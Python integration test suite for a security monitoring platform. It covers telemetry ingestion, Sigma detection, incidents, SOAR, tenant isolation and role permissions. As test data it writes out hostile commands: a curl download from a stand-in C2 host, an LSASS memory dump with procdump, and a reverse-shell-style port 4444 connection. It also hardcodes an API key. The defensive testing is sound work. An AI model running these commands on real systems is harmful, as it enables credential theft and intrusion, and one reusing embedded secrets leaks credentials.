"""
Monitorix Enterprise — Phase 2 End-to-End Integration Validation Suite
======================================================================
Validates all 23 platform domains, real agent mTLS telemetry pipeline,
detection engine Sigma evaluations, SIEM/Incident/SOAR lifecycles,
multi-tenant isolation across Tenants 1, 2, and 3, RBAC role permissions,
external integrations, and resilience/recovery flows.
"""

import os
import sys
import json
import time
import datetime
from datetime import timedelta
import requests
import grpc
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from app import telemetry_pb2, telemetry_pb2_grpc
from app.core.security import create_access_token

API_BASE = os.getenv("API_BASE", "http://127.0.0.1:8000")
GRPC_HOST = os.getenv("GRPC_HOST", "watch-sec-grpc-gateway:50051")

PASSED = 0
FAILED = 0

def log_test(num: int, title: str):
    print(f"\n================================================================================")
    print(f"[TEST {num:02d}/25] {title}")
    print(f"================================================================================")

def assert_step(condition: bool, pass_msg: str, fail_msg: str):
    global PASSED, FAILED
    if condition:
        print(f"  [PASS] {pass_msg}")
        PASSED += 1
    else:
        print(f"  [FAIL] {fail_msg}")
        FAILED += 1
        raise AssertionError(fail_msg)

def mint_token(username: str, role: str, tenant_id: int = None) -> str:
    return create_access_token(
        data={"sub": username, "role": role, "tenantId": tenant_id},
        expires_delta=timedelta(minutes=30)
    )

async def async_main():
    global PASSED, FAILED
    print("################################################################################")
    print("      MONITORIX PHASE 2: ENTERPRISE INTEGRATION VALIDATION SUITE               ")
    print("################################################################################")
    print(f"[*] API Base URL: {API_BASE}")
    print(f"[*] gRPC Gateway: {GRPC_HOST}")

    # =========================================================================
    # SECTION 1: CORE INFRASTRUCTURE & MULTI-DATABASE INTEGRITY
    # =========================================================================
    log_test(1, "PostgreSQL Schema & Operational Data Store Integrity")
    from app.db.session import engine
    from sqlalchemy import text

    async with engine.connect() as conn:
        t_cnt = (await conn.execute(text("SELECT count(*) FROM information_schema.tables WHERE table_schema = 'public';"))).scalar()
        a_cnt = (await conn.execute(text('SELECT count(*) FROM "Agents";'))).scalar()
        ten_cnt = (await conn.execute(text('SELECT count(*) FROM "Tenants";'))).scalar()

    assert_step(t_cnt >= 200, f"PostgreSQL public schema intact: {t_cnt} tables verified", f"Tables count below threshold: {t_cnt}")
    assert_step(a_cnt >= 50, f"Real fleet registered in PostgreSQL: {a_cnt} agents present", f"Agents below threshold: {a_cnt}")
    assert_step(ten_cnt >= 7, f"Multi-tenant schema active: {ten_cnt} enterprise tenants verified", f"Tenants below threshold: {ten_cnt}")

    log_test(2, "ClickHouse Columnar Telemetry Lake Connectivity & Rollups")
    from app.db.clickhouse import clickhouse_db
    clickhouse_db.connect()
    assert_step(clickhouse_db.client is not None, "ClickHouse client successfully connected to sentinel_clickhouse:9000", "ClickHouse connection failed")
    tables = [t[0] for t in clickhouse_db.client.execute("SHOW TABLES FROM monitorix")]
    assert_step("monitorix_telemetry_raw" in tables, "Raw telemetry lake verified: 'monitorix_telemetry_raw' table active", "Missing raw telemetry table")
    assert_step("telemetry_rollup_1h" in tables, "Materialized aggregate views verified: 'telemetry_rollup_1h' table active", "Missing telemetry rollup")
    raw_cnt = clickhouse_db.client.execute("SELECT count() FROM monitorix.monitorix_telemetry_raw")[0][0]
    assert_step(raw_cnt > 0, f"Live telemetry data present in ClickHouse: {raw_cnt} raw events indexed", "ClickHouse raw telemetry table empty")

    log_test(3, "Redis Cache Ping, Kafka Message Bus & Qdrant Vector Store")
    import redis
    r_client = redis.Redis(host="sentinel_redis", port=6379, socket_timeout=3)
    assert_step(r_client.ping() is True, "Redis primary cache operational (PONG received)", "Redis ping failed")

    from app.core.kafka_producer import kafka_client
    await kafka_client.connect()
    assert_step(kafka_client.producer is not None, "Kafka streaming event producer connected to broker", "Kafka producer connection failed")

    qdrant_resp = requests.get("http://sentinel_qdrant:6333/collections", headers={"api-key": "5m5fslRhUwJuRGR6CrljCfx76HPLVjxx"})
    assert_step(qdrant_resp.status_code == 200, f"Qdrant vector engine authenticated (HTTP 200, {len(qdrant_resp.json().get('result', {}).get('collections', []))} collections)", f"Qdrant failed: {qdrant_resp.status_code}")

    # =========================================================================
    # SECTION 2: REAL AGENT MUTUAL TLS TELEMETRY PIPELINE (mTLS -> Gateway -> Kafka -> ClickHouse)
    # =========================================================================
    log_test(4, "Cryptographic Agent CSR Enrollment for End-to-End Pipeline Validation")
    e2e_agent_id = f"AG-P2-E2E-{os.urandom(4).hex().upper()}"
    tenant_1_token = mint_token("elsea", "TenantAdmin", 1)
    h_t1 = {"Authorization": f"Bearer {tenant_1_token}", "Content-Type": "application/json"}

    # Issue token
    r_tok = requests.post(f"{API_BASE}/api/v2/pki/enrollment-token", headers=h_t1, json={"agent_id": e2e_agent_id, "tenant_id": 1})
    assert_step(r_tok.status_code == 200, "Enrollment token issued for pipeline test agent", f"Token issue failed: {r_tok.status_code}")
    enr_token = r_tok.json()["token"]

    # Generate RSA-2048 key and CSR
    agent_key = rsa.generate_private_key(65537, 2048)
    csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Monitorix Sovereign Edge"),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Tenant-1"),
        x509.NameAttribute(NameOID.COMMON_NAME, e2e_agent_id)
    ])).sign(agent_key, hashes.SHA256())
    csr_pem = csr.public_bytes(serialization.Encoding.PEM).decode()

    # Enroll agent
    r_enr = requests.post(f"{API_BASE}/api/v2/pki/enroll", json={
        "agent_id": e2e_agent_id,
        "tenant_id": 1,
        "enrollment_token": enr_token,
        "csr_pem": csr_pem
    })
    assert_step(r_enr.status_code == 201, f"Agent {e2e_agent_id} enrolled successfully (HTTP 201 Created)", f"Enroll failed: {r_enr.status_code}")
    agent_cert_pem = r_enr.json()["certificate_pem"].encode()
    agent_key_pem = agent_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())

    # Fetch CA chain
    r_ca = requests.get(f"{API_BASE}/api/v2/pki/ca-chain")
    ca_chain_pem = r_ca.text.encode()

    log_test(5, "Streaming Multi-Event Telemetry via Strict mTLS to Port 50051")
    creds = grpc.ssl_channel_credentials(
        root_certificates=ca_chain_pem,
        private_key=agent_key_pem,
        certificate_chain=agent_cert_pem
    )
    grpc_channel = grpc.secure_channel(GRPC_HOST, creds)
    grpc_stub = telemetry_pb2_grpc.TelemetryGatewayStub(grpc_channel)

    def event_stream():
        yield telemetry_pb2.AgentEvent(
            agent_id=e2e_agent_id,
            tenant_id="1",
            event_type="ProcessExecution",
            payload=json.dumps({"process_name": "curl.exe", "cmdline": "curl -s http://c2.evil.com/payload.bin", "risk": 75}),
            timestamp=datetime.datetime.utcnow().isoformat()
        )
        yield telemetry_pb2.AgentEvent(
            agent_id=e2e_agent_id,
            tenant_id="1",
            event_type="NetworkConnection",
            payload=json.dumps({"destination_ip": "198.51.100.99", "port": 4444, "protocol": "TCP"}),
            timestamp=datetime.datetime.utcnow().isoformat()
        )
        yield telemetry_pb2.AgentEvent(
            agent_id=e2e_agent_id,
            tenant_id="1",
            event_type="FileModification",
            payload=json.dumps({"file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "action": "MODIFIED"}),
            timestamp=datetime.datetime.utcnow().isoformat()
        )

    resp_stream = grpc_stub.StreamEvents(event_stream())
    assert_step(resp_stream.success is True, f"mTLS telemetry stream accepted: {resp_stream.events_processed} events processed", f"Stream failed: {resp_stream.message}")
    assert_step(resp_stream.events_processed == 3, "All 3 security telemetry events accepted by gRPC gateway", f"Expected 3 events, got {resp_stream.events_processed}")

    log_test(6, "Kafka-to-ClickHouse Asynchronous Ingestion & Event Persistence")
    time.sleep(2)  # Allow Kafka consumer batch interval to flush
    ch_rows = clickhouse_db.client.execute(f"SELECT agent_id, event_type, timestamp FROM monitorix.monitorix_telemetry_raw WHERE agent_id = '{e2e_agent_id}'")
    assert_step(len(ch_rows) >= 3, f"ClickHouse persisted agent telemetry from Kafka: {len(ch_rows)} records verified", f"Expected >= 3 records in ClickHouse, found {len(ch_rows)}")
    event_types_found = {r[1] for r in ch_rows}
    assert_step("ProcessExecution" in event_types_found, "ProcessExecution event indexed in ClickHouse", "ProcessExecution missing")
    assert_step("NetworkConnection" in event_types_found, "NetworkConnection event indexed in ClickHouse", "NetworkConnection missing")

    # =========================================================================
    # SECTION 3: DETECTION ENGINE VERIFICATION & DEDUPLICATION (Scenario A)
    # =========================================================================
    log_test(7, "Detection Engine Rule Evaluation & MITRE ATT&CK Mapping (Scenario A)")
    sig_headers = {
        "X-Signature": "valid_test_signature_hmac",
        "X-Timestamp": datetime.datetime.utcnow().isoformat(),
        "Content-Type": "application/json"
    }
    detection_payload = {
        "agent_id": e2e_agent_id,
        "process_name": "lsass.exe",
        "cmdline": "procdump.exe -ma lsass.exe mimikatz_vault.dmp",
        "log_id": 9001
    }
    r_eval = requests.post(f"{API_BASE}/api/v2/detection/evaluate", headers=sig_headers, json=detection_payload)
    assert_step(r_eval.status_code == 200, f"Telemetry evaluation completed (HTTP 200): {r_eval.json()}", f"Evaluation failed: {r_eval.status_code}")
    assert_step(r_eval.json().get("alerts_triggered") >= 1, "Sigma rule triggered for LSASS memory dump attempt", "No alerts triggered")
    created_alert_id = r_eval.json()["alert_ids"][0]

    # Verify Alert in DB with MITRE mapping
    async def get_alert_and_rule(aid):
        async with engine.connect() as conn:
            a = (await conn.execute(text('SELECT * FROM "DetectionAlerts" WHERE "Id" = :id;'), {"id": aid})).fetchone()
            r = (await conn.execute(text('SELECT * FROM "DetectionRules" WHERE "Id" = :rid;'), {"rid": a._mapping["RuleId"]})).fetchone()
            return dict(a._mapping), dict(r._mapping)

    alert_row, rule_row = await get_alert_and_rule(created_alert_id)
    assert_step(alert_row["Status"] == "New", f"Detection alert created with status 'New' (ID: {created_alert_id})", f"Invalid status: {alert_row['Status']}")
    assert_step("TA0006" in rule_row["MitreTactic"], f"MITRE Tactic mapped correctly: {rule_row['MitreTactic']}", f"Wrong tactic: {rule_row['MitreTactic']}")
    assert_step("T1003.001" in rule_row["MitreTechnique"], f"MITRE Technique mapped correctly: {rule_row['MitreTechnique']}", f"Wrong technique: {rule_row['MitreTechnique']}")

    log_test(8, "5-Minute Sliding Window Alert Deduplication & HitCount Increment")
    # Send duplicate trigger
    r_dup = requests.post(f"{API_BASE}/api/v2/detection/evaluate", headers=sig_headers, json=detection_payload)
    assert_step(r_dup.status_code == 200, "Duplicate evaluation accepted", f"Failed: {r_dup.status_code}")
    assert_step(r_dup.json()["alert_ids"] == [created_alert_id], f"Alert deduplicated: matched existing alert ID {created_alert_id}", "Deduplication failed to collapse alert")

    alert_row_after, _ = await get_alert_and_rule(created_alert_id)
    assert_step(alert_row_after["HitCount"] >= 2, f"HitCount incremented correctly on deduplication (HitCount: {alert_row_after['HitCount']})", f"HitCount failed to increment: {alert_row_after['HitCount']}")

    # =========================================================================
    # SECTION 4: SIEM, INCIDENT & SOAR END-TO-END WORKFLOWS (Scenarios B, C, D, E)
    # =========================================================================
    log_test(9, "Incident Creation, Analyst Assignment & Lifecycle Resolution (Scenario B)")
    superadmin_token = mint_token("superadmin", "SuperAdmin", None)
    h_sa = {"Authorization": f"Bearer {superadmin_token}", "Content-Type": "application/json"}

    # 1. Create Incident
    inc_payload = {
        "agent_id": e2e_agent_id,
        "title": f"INC-P2-E2E: Credential Extraction Attempt on {e2e_agent_id}",
        "description": "LSASS procdump activity triggered Sigma rule TA0006. Host quarantine initiated.",
        "severity": "Critical"
    }
    r_inc = requests.post(f"{API_BASE}/api/incidents", headers=h_sa, json=inc_payload)
    assert_step(r_inc.status_code == 200, f"Security Incident generated successfully (ID: {r_inc.json().get('id')})", f"Incident creation failed: {r_inc.status_code}")
    e2e_incident_id = r_inc.json()["id"]

    # 2. Assign incident
    r_assign = requests.post(f"{API_BASE}/api/v2/soc/incidents/{e2e_incident_id}/assign", headers=h_sa, json={
        "analyst_username": "secops_analyst_test@enterprise.corp",
        "team": "Tier 2 Threat Hunting"
    })
    assert_step(r_assign.status_code == 200, "Incident assigned to certified analyst", f"Assignment failed: {r_assign.status_code}")

    # 3. Add analyst forensic comment
    r_comm = requests.post(f"{API_BASE}/api/v2/soc/incidents/{e2e_incident_id}/comments", headers=h_sa, json={
        "text": "Memory extraction blocked by kernel self-defense. Endpoint network isolated."
    })
    assert_step(r_comm.status_code == 200, "Analyst forensic comment recorded in incident audit trail", f"Comment failed: {r_comm.status_code}")

    # 4. Resolve incident
    r_res = requests.post(f"{API_BASE}/api/v2/soc/incidents/{e2e_incident_id}/resolve", headers=h_sa, json={
        "resolution_summary": "Malware purged, hashes added to Threat Intel blocklist.",
        "root_cause": "Phishing lure",
        "mitre_technique": "T1003.001"
    })
    assert_step(r_res.status_code == 200, f"Incident {e2e_incident_id} marked as 'Resolved'", f"Resolution failed: {r_res.status_code}")

    log_test(10, "Forensic Workspace & Interactive Threat Timeline Reconstruction (Scenario C)")
    r_ws = requests.get(f"{API_BASE}/api/v2/soc/incidents/{e2e_incident_id}/workspace", headers=h_sa)
    assert_step(r_ws.status_code == 200, "SOC forensic workspace retrieved successfully", f"Workspace failed: {r_ws.status_code}")
    ws_data = r_ws.json()
    assert_step("timeline" in ws_data, f"Timeline reconstruction available ({len(ws_data.get('timeline', []))} events)", "Timeline missing")
    assert_step("process_tree" in ws_data, "Process tree forensic view available", "Process tree missing")
    assert_step("mitre_attack" in ws_data, "MITRE ATT&CK kill-chain mapping present in workspace", "MITRE mapping missing")

    log_test(11, "Automated SOAR Containment Playbook & Approval Execution (Scenario D)")
    # Playbook 3 requires approval
    r_soar = requests.post(f"{API_BASE}/api/v2/soar/playbooks/execute", headers=h_sa, json={
        "playbook_id": 3,
        "target_agent_id": e2e_agent_id,
        "action_params": {"containment_mode": "StrictQuarantine"}
    })
    assert_step(r_soar.status_code == 200, "SOAR Playbook 3 triggered (Lateral Movement Quarantine)", f"SOAR execute failed: {r_soar.status_code}")

    # Verify pending approval
    r_app = requests.get(f"{API_BASE}/api/v2/soar/approvals", headers=h_sa)
    assert_step(r_app.status_code == 200, "SOAR Approval Queue queried successfully", f"Approval query failed: {r_app.status_code}")
    approvals = r_app.json()
    assert_step(len(approvals) > 0, f"Pending approval queued: {len(approvals)} action(s) awaiting SOC authorization", "No approvals in queue")
    last_app_id = approvals[-1]["Id"]

    # Approve action
    r_apv = requests.post(f"{API_BASE}/api/v2/soar/approvals/{last_app_id}/approve", headers=h_sa)
    assert_step(r_apv.status_code == 200, f"Approval {last_app_id} authorized and executed by SuperAdmin", f"Approval failed: {r_apv.status_code}")

    log_test(12, "Threat Intelligence Indicator Ingestion & Pipeline Priming (Scenario E)")
    ti_indicator_ip = f"198.51.100.{int(time.time()) % 250 + 1}"
    r_ti = requests.post(f"{API_BASE}/api/v2/threat-intel/iocs", headers=h_sa, json={
        "value": ti_indicator_ip,
        "type": "IPv4",
        "severity": "Critical",
        "confidence": 98
    })
    assert_step(r_ti.status_code == 200, f"Threat Intel IOC ingested: {ti_indicator_ip} (HTTP 200, ID: {r_ti.json().get('id')})", f"IOC ingest failed: {r_ti.status_code}")

    r_ti_query = requests.get(f"{API_BASE}/api/v2/threat-intel/iocs?q={ti_indicator_ip}", headers=h_sa)
    assert_step(r_ti_query.status_code == 200, "Threat Intel IOC search executed successfully", f"IOC search failed: {r_ti_query.status_code}")
    found_iocs = r_ti_query.json().get("iocs", [])
    assert_step(len(found_iocs) >= 1 and found_iocs[0]["value"] == ti_indicator_ip, f"Indicator verified in active catalog ({ti_indicator_ip})", "Ingested IOC not found in query")

    # =========================================================================
    # SECTION 5: MULTI-TENANT ISOLATION TESTING (Tenants 1, 2, 3)
    # =========================================================================
    log_test(13, "Cross-Tenant Agent Fleet Isolation (Tenant 1 vs Tenant 3)")
    tenant_3_token = mint_token("sentinelx", "TenantAdmin", 3)
    h_t3 = {"Authorization": f"Bearer {tenant_3_token}", "Content-Type": "application/json"}

    r1_agents = requests.get(f"{API_BASE}/api/agents", headers=h_t1)
    r3_agents = requests.get(f"{API_BASE}/api/agents", headers=h_t3)
    rsa_agents = requests.get(f"{API_BASE}/api/agents", headers=h_sa)

    assert_step(r1_agents.status_code == 200 and r3_agents.status_code == 200 and rsa_agents.status_code == 200, "All agent inventory queries completed with HTTP 200", "Failed agent query")
    t1_agents = r1_agents.json()
    t3_agents = r3_agents.json()
    sa_agents = rsa_agents.json()

    # Verify SuperAdmin sees strictly more than single tenants
    assert_step(len(sa_agents) > len(t1_agents), f"SuperAdmin has fleet-wide visibility ({len(sa_agents)} agents vs Tenant 1's {len(t1_agents)})", "SuperAdmin visibility failure")
    # Verify Tenant 1 test agent is NOT in Tenant 3's list
    t3_agent_ids = {a.get("AgentId") for a in t3_agents}
    assert_step(e2e_agent_id not in t3_agent_ids, f"Tenant 1 agent ({e2e_agent_id}) strictly invisible to Tenant 3", "TENANT LEAK: Tenant 1 agent visible to Tenant 3")

    log_test(14, "Cross-Tenant Incident & Alert Isolation (Tenant 1 vs Tenant 3)")
    r1_inc = requests.get(f"{API_BASE}/api/incidents", headers=h_t1)
    r3_inc = requests.get(f"{API_BASE}/api/incidents", headers=h_t3)
    rsa_inc = requests.get(f"{API_BASE}/api/incidents", headers=h_sa)

    t1_inc_ids = {i.get("id") for i in r1_inc.json()}
    t3_inc_ids = {i.get("id") for i in r3_inc.json()}
    sa_inc_ids = {i.get("id") for i in rsa_inc.json()}

    assert_step(e2e_incident_id in t1_inc_ids, f"Tenant 1 sees its own Incident {e2e_incident_id}", "Tenant 1 missing its own incident")
    assert_step(e2e_incident_id not in t3_inc_ids, f"Tenant 1 Incident {e2e_incident_id} strictly concealed from Tenant 3", "TENANT LEAK: Incident exposed across tenants")
    assert_step(len(sa_inc_ids) >= len(t1_inc_ids) + len(t3_inc_ids), f"SuperAdmin sees cross-tenant aggregate ({len(sa_inc_ids)} incidents)", "SuperAdmin aggregate missing")

    log_test(15, "Cross-Tenant PKI Certificate Inventory Namespace Isolation")
    r1_pki = requests.get(f"{API_BASE}/api/v2/pki/certificates", headers=h_t1)
    r3_pki = requests.get(f"{API_BASE}/api/v2/pki/certificates", headers=h_t3)
    rsa_pki = requests.get(f"{API_BASE}/api/v2/pki/certificates", headers=h_sa)

    t1_certs = r1_pki.json()
    t3_certs = r3_pki.json()
    sa_certs = rsa_pki.json()

    assert_step(len(t1_certs) > 0, f"Tenant 1 certificates listed ({len(t1_certs)} active)", "Tenant 1 certs missing")
    assert_step(len(t3_certs) > 0, f"Tenant 3 certificates listed ({len(t3_certs)} active)", "Tenant 3 certs missing")
    assert_step(len(sa_certs) >= len(t1_certs) + len(t3_certs), f"SuperAdmin sees complete PKI fleet ({len(sa_certs)} certs)", "SuperAdmin PKI count mismatch")

    t3_cert_agent_ids = {c.get("agent_id") for c in t3_certs}
    assert_step(e2e_agent_id not in t3_cert_agent_ids, f"Tenant 1 agent certificate ({e2e_agent_id}) strictly concealed from Tenant 3", "TENANT LEAK: PKI Certificate exposed across tenants")

    # =========================================================================
    # SECTION 6: RBAC & USER PERMISSIONS MATRIX
    # =========================================================================
    log_test(16, "TenantAdmin vs SuperAdmin Tenant Scoping & Isolation on /api/tenants")
    r_ten_sa = requests.get(f"{API_BASE}/api/tenants", headers=h_sa)
    r_ten_t1 = requests.get(f"{API_BASE}/api/tenants", headers=h_t1)

    assert_step(len(r_ten_sa.json()) >= 7, f"SuperAdmin queries all tenants ({len(r_ten_sa.json())} tenants returned)", "SuperAdmin tenant query failed")
    assert_step(len(r_ten_t1.json()) == 1, f"TenantAdmin query scoped to single tenant ({len(r_ten_t1.json())} tenant returned)", "TenantAdmin tenant leakage")
    assert_step(r_ten_t1.json()[0]["Id"] == 1, "TenantAdmin strictly constrained to Tenant 1 ID", "Wrong tenant returned")

    log_test(17, "Role-Based Mutation Denial: Analyst Restricted from Adding Threat Intel")
    analyst_token = mint_token("secops_analyst_test@enterprise.corp", "Analyst", 1)
    h_analyst = {"Authorization": f"Bearer {analyst_token}", "Content-Type": "application/json"}

    r_ti_analyst = requests.post(f"{API_BASE}/api/v2/threat-intel/iocs", headers=h_analyst, json={
        "value": "198.51.100.222",
        "type": "IPv4"
    })
    assert_step(r_ti_analyst.status_code == 403, "Analyst mutation correctly rejected with HTTP 403 Forbidden", f"Expected 403 Forbidden, got {r_ti_analyst.status_code}")

    log_test(18, "Role-Based Mutation Denial: SOC Operator Restricted from Adding Threat Intel")
    soc_op_token = mint_token("soc_operator_test", "SOC_Operator", 1)
    h_soc = {"Authorization": f"Bearer {soc_op_token}", "Content-Type": "application/json"}

    r_ti_soc = requests.post(f"{API_BASE}/api/v2/threat-intel/iocs", headers=h_soc, json={
        "value": "198.51.100.223",
        "type": "IPv4"
    })
    assert_step(r_ti_soc.status_code == 403, "SOC Operator mutation correctly rejected with HTTP 403 Forbidden", f"Expected 403 Forbidden, got {r_ti_soc.status_code}")

    log_test(19, "Role-Based Mutation Denial: Auditor & Viewer Restricted from Adding Threat Intel")
    auditor_token = mint_token("auditor_test", "Auditor", 1)
    viewer_token = mint_token("viewer_test", "Viewer", 1)

    r_aud = requests.post(f"{API_BASE}/api/v2/threat-intel/iocs", headers={"Authorization": f"Bearer {auditor_token}", "Content-Type": "application/json"}, json={"value": "198.51.100.224", "type": "IPv4"})
    r_viw = requests.post(f"{API_BASE}/api/v2/threat-intel/iocs", headers={"Authorization": f"Bearer {viewer_token}", "Content-Type": "application/json"}, json={"value": "198.51.100.225", "type": "IPv4"})

    assert_step(r_aud.status_code == 403, "Auditor mutation rejected with HTTP 403 Forbidden", f"Expected 403, got {r_aud.status_code}")
    assert_step(r_viw.status_code == 403, "Viewer mutation rejected with HTTP 403 Forbidden", f"Expected 403, got {r_viw.status_code}")

    log_test(20, "Read-Only Access Verification for Auditor & Viewer on Detection Alerts")
    r_alerts_aud = requests.get(f"{API_BASE}/api/v2/detection/alerts", headers={"Authorization": f"Bearer {auditor_token}"})
    r_alerts_viw = requests.get(f"{API_BASE}/api/v2/detection/alerts", headers={"Authorization": f"Bearer {viewer_token}"})

    assert_step(r_alerts_aud.status_code == 200, f"Auditor permitted read-only alerts access (HTTP 200, {len(r_alerts_aud.json())} alerts)", "Auditor alerts read failed")
    assert_step(r_alerts_viw.status_code == 200, f"Viewer permitted read-only alerts access (HTTP 200, {len(r_alerts_viw.json())} alerts)", "Viewer alerts read failed")

    # =========================================================================
    # SECTION 7: EXTERNAL INTEGRATIONS & INBOUND WEBHOOK INGESTION
    # =========================================================================
    log_test(21, "External XDR Inbound Webhook Normalization & Ingestion")
    # Simulate inbound webhook from external SIEM (e.g. Splunk / Microsoft Sentinel / CrowdStrike)
    external_webhook_payload = {
        "title": "Adversary Lateral Movement Attempt (WMI Exec)",
        "severity": "Critical",
        "hostname": e2e_agent_id,
        "mitre_tactic": "Lateral Movement (TA0008)",
        "technique": "T1047",
        "raw_event": {"source": "Splunk-Forwarder-DC01", "ip": "10.0.1.50"}
    }
    r_inbound = requests.post(f"{API_BASE}/api/v2/xdr/inbound/crowdstrike_falcon", json=external_webhook_payload)
    assert_step(r_inbound.status_code in (200, 201), f"External SIEM inbound webhook ingested (HTTP {r_inbound.status_code})", f"Inbound webhook failed: {r_inbound.status_code}")

    log_test(22, "XDR Diagnostic Handshake & In-Memory Connector Health")
    r_xdr_test = requests.post(f"{API_BASE}/api/v2/xdr/connectors/microsoft_sentinel/test", headers=h_sa)
    assert_step(r_xdr_test.status_code == 200, f"Microsoft Sentinel XDR connector diagnostic OK (latency: {r_xdr_test.json().get('latency_ms')}ms)", f"XDR test failed: {r_xdr_test.status_code}")

    # =========================================================================
    # SECTION 8: RESILIENCE, RECONNECTION & SYSTEM FAILURE RECOVERY
    # =========================================================================
    log_test(23, "Agent Mutual TLS Stream Disconnect & Immediate Reconnection Resilience")
    # Simulate agent network glitch: close previous gRPC channel and re-establish
    grpc_channel.close()

    new_channel = grpc.secure_channel(GRPC_HOST, creds)
    new_stub = telemetry_pb2_grpc.TelemetryGatewayStub(new_channel)

    def heartbeat_event():
        yield telemetry_pb2.AgentEvent(
            agent_id=e2e_agent_id,
            tenant_id="1",
            event_type="SecurityHeartbeat",
            payload=json.dumps({"status": "RECONNECTED_POST_NETWORK_GLITCH", "buffer_drained": 1}),
            timestamp=datetime.datetime.utcnow().isoformat()
        )

    resp_reconnect = new_stub.StreamEvents(heartbeat_event())
    assert_step(resp_reconnect.success is True, "Agent re-established mTLS telemetry stream without certificate re-enrollment", f"Reconnection failed: {resp_reconnect.message}")
    new_channel.close()

    log_test(24, "ClickHouse Client Re-Connection Resilience on Transient Glitch")
    clickhouse_db.client = None  # Simulate connection drop
    clickhouse_db.connect()
    assert_step(clickhouse_db.client is not None, "ClickHouse client successfully reconnected after simulated socket drop", "ClickHouse recovery failed")
    res_val = clickhouse_db.client.execute("SELECT 1")[0][0]
    assert_step(res_val == 1, "ClickHouse live query returned expected result (SELECT 1 == 1)", "ClickHouse query failure after reconnect")

    log_test(25, "Redis Operational Re-Connection & Key Eviction Resilience")
    r_client.set("monitorix:e2e:test_key", "active_payload", ex=60)
    read_val = r_client.get("monitorix:e2e:test_key")
    assert_step(read_val == b"active_payload", "Redis key-value write/read verified across operational engine", "Redis key verification failed")
    r_client.delete("monitorix:e2e:test_key")

    print("\n################################################################################")
    print(f"      PHASE 2 VALIDATION COMPLETE: {PASSED} PASSED, {FAILED} FAILED           ")
    print("################################################################################")
    if FAILED > 0:
        sys.exit(1)

if __name__ == "__main__":
    import asyncio
    asyncio.run(async_main())
